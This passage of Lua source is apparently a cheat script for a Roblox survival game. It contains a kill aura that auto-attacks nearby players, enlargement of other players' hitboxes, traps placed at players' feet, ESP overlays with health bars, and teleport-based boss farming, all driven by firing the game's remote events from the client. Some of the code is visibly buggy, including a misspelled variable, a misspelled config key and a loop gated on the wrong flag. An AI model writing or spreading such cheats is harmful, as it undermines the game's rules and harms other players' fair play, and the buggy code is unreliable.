                            if ore:FindFirstChild('Health') and not ore:FindFirstChild('Humanoid') and not ore:FindFirstChild('HumanoidRootPart') then
                                local obj
                                local dist
                                obj = ore:GetPivot().Position
                                local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                dist = (mypos - obj).magnitude
                                if dist < range then
                                    if ore.Name == 'Plantain' then
                                        if ore:FindFirstChild('Tree') and ore:FindFirstChild('Tree'):FindFirstChild('Palm Tree_Trunk') then
                                            obj = Vector3.new(3378, 15, -4475)
                                        end
                                    end
                                    dist = (mypos - obj).magnitude
                                    range = dist
                                    closestore = ore
                                end
                            end
                        end
                    end
                    return closestore
                end
                local NearestOre = getclosestore()
                if NearestOre then
                    RemoteEvents['ToolAction']:FireServer(NearestOre)
                end
            end
        end
    end
end

function MobAura()
    while getgenv().configs.MobAura do
        if getgenv().configs.MobAura then
            task.wait(.15)
            local function getclosestmob()
                local range = 30
                local closestmob = nil
                if IsPlayerAlive(LocalPlayer) then
                    for _, mob in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if mob:FindFirstChild('HumanoidRootPart') and mob:FindFirstChild('Humanoid') and mob:FindFirstChild('Humanoid').Health > 0 then
                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                            local mobpos = mob.HumanoidRootPart.Position
                            local dist = (mypos - mobpos).magnitude
                            if dist < range then
                                range = dist
                                closestmob = mob
                            end
                        end
                    end
                end
                return closestmob
            end
            local nearestmob = getclosestmob()
            if nearestmob then
                RemoteEvents['ToolAction']:FireServer(nearestmob)
            end
        end
    end
end

function KillAura()
    while getgenv().configs.KillAura do
        if getgenv().configs.KillAura then
            task.wait()
            local function GetClosestKAPlayer()
                local range = 32
                local closest
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        if not table.find(Whitelist_table, plr.Name) then
                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                                local char = plr.Character
                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                        local plrpos = plr.Character.HumanoidRootPart.Position
                                        local dist = (mypos - plrpos).magnitude
                                        if dist < range then
                                            range = dist
                                            closest = plr.Character
                                        end
                                    else
                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                            local plrpos = plr.Character.HumanoidRootPart.Position
                                            local dist = (mypos - plrpos).magnitude
                                            if dist < range then
                                                range = dist
                                                closest = plr.Character
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                return closest
            end
            local NearestPlayer = GetClosestKAPlayer()
            if NearestPlayer then
                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
            end
        end
    end
end

function Pumpkins()
    while getgenv().configs.Pumpkins do
        if getgenv().configs.Pumpkins then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                local hum = LocalPlayer.Character.Humanoid
                if hum.Health < 65 then
                    RemoteEvents['InventoryInteraction']:FireServer(378, "Eat")
                end
            end
        end
    end
end

function Hitbox()
    while getgenv().configs.Hitbox do
        if getgenv().configs.Hitbox then
            task.wait(0.2)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    if IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                        if plr.Character.Hitbox.Size ~= Vector3.new(20, 20, 20) then
                            plr.Character.Hitbox.Size = Vector3.new(20, 20, 20)
                        end
                    end
                end
            end
        end
    end
end

function SafeDeath()
    if getgenv().configs.SafeDeath then
        if not SafeDeathHealthChecker then
            SafeDeathHealthChecker = LocalPlayer.Character:WaitForChild('Humanoid').HealthChanged:Connect(function(health)
                if getgenv().configs.SafeDeath then
                    if not TeleportHappened then
                        if health <= 35 then
                            getgenv().configs.ZenLuckBoss = false
                            getgenv().configs.SpiritBoss = false
                            getgenv().configs.ObsidianBoss = false
                            getgenv().configs.Ogre = false
                            getgenv().configs.Squid = false
                            getgenv().configs.LuckySlime = false
                            getgenv().configs.EvilSkeleton = false
                            local SavePlayer = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Vector3.new(7135, 73, 18677))})
                            SavePlayer:Play()
                            MakeAtlasNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
                            TeleportHappened = true
                            TimeTped = tick()
                        end
                    else
                        if tick() > TimeTped+TimeBetweenTps then
                            TeleportHappened = false
                        end
                    end
                end
            end)
        end
    end
end

function OpKillAura()
    local wastrue = false
    while getgenv().configs.OpKillAura do
        if getgenv().configs.OpKillAura then
            task.wait()
			if OpKillAuraTable[1] then
				if IsPlayerAlive(OpKillAuraTable[1]) and IsPlayerAlive(LocalPlayer) then
					local myroot = LocalPlayer.Character.HumanoidRootPart
					local enemyroot = OpKillAuraTable[1].Character.HumanoidRootPart
					if getgenv().configs.PredictOpKillAura then
						myroot.CFrame = CFrame.new(enemyroot.Position + (enemyroot.AssemblyLinearVelocity/getgenv().PredictAmount))
					else
						myroot.CFrame = CFrame.new(enemyroot.Position)
					end
					if LocalPlayer.Character.Humanoid.Health <= 20 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("You are low!", 'Ive saved you. Heal up.', 8)
					return end
					MyYPos = LocalPlayer.Character.HumanoidRootPart.CFrame.Y
					if MyYPos <= -800 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("Suicide", "Careful, hes trying to suicide you", 3)
					return end
					RemoteEvents['ToolAction']:FireServer(OpKillAuraTable[1].Character)
					if not getgenv().configs.OpKillAura and LocalPlayer.Character.Humanoid.Health > 25 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(enemyroot + Vector3.new(0, 25, 0))
					end
				end
			end
        end
    end
end

function ConiferFarm()
    local function GetClosestTree()
        local range = math.huge
        local closestree
        for _, tree in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if tree.Name == 'Conifer' then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - tree:GetPivot().Position).magnitude
                if dist < range then
                    range = dist
                    closestree = tree
                end
            end
        end
        return closestree
    end

    local function TreeFarm()
        local ClosestTree
        ClosestTree = GetClosestTree()
        if ClosestTree then
            repeat task.wait()
                ClosestTree = GetClosestTree()
                if not getgenv().configs.ConfierFarm then 
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
                    end
                    return
                end
                if losestTree.Parent then
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ClosestTree:GetPivot().Position)
                        RemoteEvents['ToolAction']:FireServer(ClosestTree)
                    end
                end
            until not ClosestTree.Parent or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.ConfierFarm
        end
    end
    while getgenv().configs.ConfierFarm and task.wait() do
        if not getgenv().configs.ConfierFarm then 
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
            end
        end
        if IsPlayerAlive(LocalPlayer) then
            if not Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Conifer') then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X, 400, LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
            else
                TreeFarm()
            end
        end
    end
end

function AutoRepairClub()
    if getgenv().configs.AutoRepairClub then
        local zenwastrue = false
        local spiritwastrue = false
        local obwastrue = false
        for _, tool in pairs(MyInventory:GetChildren()) do
            if tool.Name == 'Obsidian Club' then
                if not getgenv().PercentChanged then
                    getgenv().PercentChanged = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label'):GetPropertyChangedSignal("Text"):Connect(function()
                        if not getgenv().configs.AutoRepairClub then
                            getgenv().PercentChanged:Disconnect()
                            getgenv().PercentChange = nil
                            return
                        end
                        local percentdegraded = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(1, 4)
                        local checkdecimal = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(3, 3)
                        if checkdecimal == '.' then
                            if tonumber(percentdegraded) <= 50.5 then
                                local ClosestChest = GetClosestChest()
                                if ClosestChest then
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                    MakeAtlasNotification('Repaired', 'Club repaired', 1)
                                    task.wait(0.2)
                                    pcall(function()
                                        if MyInventory:FindFirstChild('Obsidian Club') then
                                            if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                            end
                                        end
                                    end)
                                else
                                    if getgenv().configs.ZenLuckBoss then
                                        zenwastrue = true
                                        getgenv().configs.ZenLuckBoss = false
                                    elseif getgenv().configs.SpiritBoss then
                                        spiritwastrue = true
                                        getgenv().configs.SpiritBoss = false
                                    elseif getgenv().configs.ObsidianBoss then
                                        obwastrue = true
                                        getgenv().configs.ObsidianBoss = false
                                    end
                                    if IsPlayerAlive(LocalPlayer) then
                                        task.wait(0.2)
                                        local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
                                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(7296, 274, 18681))
                                        task.wait(0.5)
                                        RemoteEvents['CraftItem']:FireServer(11, Vector3.new(7303.52, 288, 18678.74), 0)
                                        task.wait(0.5)
                                        local ClosestChest = GetClosestChest()
                                        if ClosestChest then
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                            MakeAtlasNotification('Repaired', 'Club repaired', 1)
                                            task.wait(0.2)
                                            pcall(function()
                                                if MyInventory:FindFirstChild('Obsidian Club') then
                                                    if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                        RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                                    end
                                                end
                                            end)
                                            if zenwastrue then
                                                zenwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ZenLuckBoss = true
                                                    ZenLuckBoss()
                                                end)
                                            elseif spiritwastrue then
                                                spiritwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.SpiritBoss = true
                                                    SpiritBoss()
                                                end)
                                            elseif obwastrue then
                                                obwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ObsidianBoss = true
                                                    ObsidianBoss()
                                                end)
                                            else
                                                LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end
    else
        if getgenv().PercentChanged then
            getgenv().PercentChanged:Disconnect()
            getgenv().PercentChanged = nil
        end
    end
end

function TrapPlayer()
    if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(371, GetClosestTrapPlayer(), 690)
    end
end

function ObsidianBoss()
    while getgenv().configs.ObsidianBoss do
        if getgenv().configs.ObsidianBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
            local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem')
                if not getgenv().configs.ZenLuckBoss and not getgenv().configs.SpiritBoss then
                    if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                        if not AutoPickupOnObsidianDeath then
                            AutoPickupOnObsidianDeath = Boss.AncestryChanged:Connect(function(golem, parent)
                                if not getgenv().configs.ObsidianBoss then
                                    AutoPickupOnObsidianDeath:Disconnect()
                                    AutoPickupOnObsidianDeath = nil
                                end
                                if not parent then
                                    task.wait(0.2)
                                    AutoPickup()
                                    if AutoPickupOnObsidianDeath then
                                        AutoPickupOnObsidianDeath:Disconnect()
                                        AutoPickupOnObsidianDeath = nil
                                    end
                                end
                            end)
                        end
                        local bosspos = Boss.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart
                        if Boss.Humanoid.Health > 50 then
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                        else
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                        end
                        RemoteEvents['ToolAction']:FireServer(Boss)
                    end
                end
            end
        end
    end
end

function ZenLuckBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnZenLuckBossDeath then
                AutoPickupOnZenLuckBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.ZenLuckBoss then
                        AutoPickupOnZenLuckBossDeath:Disconnect()
                        AutoPickupOnZenLuckBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnZenLuckBossDeath then
                            AutoPickupOnZenLuckBossDeath:Disconnect()
                            AutoPickupOnZenLuckBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health > 50 then
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13, 0))
            else
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 10, 0))
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnZenLuckBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):WaitForChild("Cave Door (z)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters") then
                    Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters"):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function SpiritBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnSpiritBossDeath then
                AutoPickupOnSpiritBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.SpiritBoss then
                        AutoPickupOnSpiritBossDeath:Disconnect()
                        AutoPickupOnSpiritBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnSpiritBossDeath then
                            AutoPickupOnSpiritBossDeath:Disconnect()
                            AutoPickupOnSpiritBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health >= 50 then
                TweenService:Create(myroot, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(-13, 18, 0))}):Play()
            else
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(0, 22, 0))}):Play()
            end
            if not getgenv().configs.SpiritBoss == false then
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(25, 18, 0))}):Play()
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnSpiritBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Mushroom Boss Cave "):WaitForChild("Cave Door (d)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:FindFirstChild('PoisionMushroom') then
                    Workspace:FindFirstChild('PoisionMushroom'):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function LuckySlime()
    while getgenv().configs.LuckySlime do
        if getgenv().configs.LuckySlime then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Lucky Slime')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickuponLuckySlimeDeath then
                        AutoPickuponLuckySlimeDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.LuckySlime then
                                AutoPickuponLuckySlimeDeath:Disconnect()
                                AutoPickuponLuckySlimeDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickuponLuckySlimeDeath then
                                    AutoPickuponLuckySlimeDeath:Disconnect()
                                    AutoPickuponLuckySlimeDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function EvilSkeleton()
    while getgenv().configs.EvilSkeleton do
        if getgenv().configs.EvilSkeleton then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Evil Skeleton')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSkeletonDeath then
                        AutoPickupOnSkeletonDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.EvilSkeleton then
                                AutoPickupOnSkeletonDeath:Disconnect()
                                AutoPickupOnSkeletonDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSkeletonDeath then
                                    AutoPickupOnSkeletonDeath:Disconnect()
                                    AutoPickupOnSkeletonDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.EvilSkeleton then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Ogre()
    while getgenv().configs.Ogre do
        if getgenv().configs.Ogre then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Ogre')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnOgreDeath then
                        AutoPickupOnOgreDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Ogre then
                                AutoPickupOnOgreDeath:Disconnect()
                                AutoPickupOnOgreDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnOgreDeath then
                                    AutoPickupOnOgreDeath:Disconnect()
                                    AutoPickupOnOgreDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Squid()
    while getgenv().configs.Squid do
        if getgenv().configs.Squid then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Captain Squid')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSquidDeath then
                        AutoPickupOnSquidDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Squid then
                                AutoPickupOnSquidDeath:Disconnect()
                                AutoPickupOnSquidDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSquidDeath then
                                    AutoPickupOnSquidDeath:Disconnect()
                                    AutoPickupOnSquidDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.Squid then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function InfJump()
    getgenv().InfiniteJump = Mouse.KeyDown:Connect(function(Key)
        if Key == " " then
            if getgenv().configs.InfJump and IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState(3)
            else
                getgenv().InfiniteJump:Disconnect()
            end
        end
    end)
end

function JumpPower()
    while getgenv().configs.JumpPower do
        if getgenv().configs.JumpPower then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.JumpPower = 100
            end
        end
    end
end

function ExtraSpeed()
    while getgenv().configs.ExtraSpeed do
        if getgenv().configs.ExtraSpeed then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.WalkSpeed = 21
            end
        end
    end
end

local ChrAddedFunc
function PlayerEsp()
    if getgenv().configs.PlayerEsp then
        function EspOnPlayer(target)
            local EspRenderStepped
            local Boxoutline = Drawing.new('Square')
            Boxoutline.Thickness = 1
            Boxoutline.Filled = false
            Boxoutline.Transparency = 1
            Boxoutline.Color = Color3.new(0, 0, 0)
            
            local Box = Drawing.new('Square')
            Box.Thickness = 1
            Box.Transparency = 1
            Box.Filled = false
            Box.Color = Color3.fromRGB(0, 255, 0)
            
            local Healthbaroutline = Drawing.new('Square')
            Healthbaroutline.Thickness = 1
            Healthbaroutline.Filled = false
            Healthbaroutline.Transparency = 1
            Healthbaroutline.Color = Color3.new(0, 0, 0)
            
            local Healthbar = Drawing.new('Square')
            Healthbar.Thickness = 1
            Healthbar.Filled = false
            Healthbar.Transparency = 1
            Healthbar.Color = Color3.fromRGB(0, 255, 0)
            EspRenderStepped = RunService.RenderStepped:Connect(function()
                if getgenv().configs.PlayerEsp == false then
                    if Boxoutline then
                        Boxoutline:Remove()
                    end
                    if Box then
                        Box:Remove()
                    end
                    if Healthbaroutline then
                        Healthbaroutline:Remove()
                    end
                    if Healthbar then
                        Healthbar:Remove()
                    end
                    if EspRenderStepped then
                        EspRenderStepped:Disconnect()
                    end
                return end
                if target then
                    if IsPlayerAlive(target) then
                        local HumPos, onScreen = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position)
                        if onScreen then
                            local headpos = Camera:WorldToViewportPoint(target.Character.Head.Position + Vector3.new(0, 0.5, 0))
                            local LegPosition = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position - Vector3.new(0, 4.5, 0))
                            
                            Boxoutline.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Boxoutline.Position = Vector2.new(HumPos.X - Boxoutline.Size.X / 2, HumPos.Y - Boxoutline.Size.Y / 2)
                            Boxoutline.Visible = true
                            
                            Box.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Box.Position = Vector2.new(HumPos.X - Box.Size.X / 2, HumPos.Y - Box.Size.Y / 2 )
                            Box.Visible = true
                            
                            Healthbaroutline.Size = Vector2.new(2, headpos.Y - LegPosition.Y)
                            Healthbaroutline.Position = Boxoutline.Position - Vector2.new(8, 0)
                            Healthbaroutline.Visible = true
                            
                            Healthbar.Size = Vector2.new(2, (headpos.Y - LegPosition.Y) / (target.Character:FindFirstChildOfClass('Humanoid').MaxHealth / math.clamp(target.Character:FindFirstChildOfClass('Humanoid').Health, 0, target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)))
                            Healthbar.Position = Vector2.new(Box.Position.X - 8, Box.Position.Y + (1/Healthbar.Size.Y))
                            Healthbar.Color = Color3.fromRGB(255, 0, 0):lerp(Color3.fromRGB(0, 255, 0), target.Character:FindFirstChildOfClass('Humanoid').Health / target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)
                            Healthbar.Visible = true
                        else
                            Boxoutline.Visible = false
                            Box.Visible = false
                            Healthbaroutline.Visible = false
                            Healthbar.Visible = false
                        end
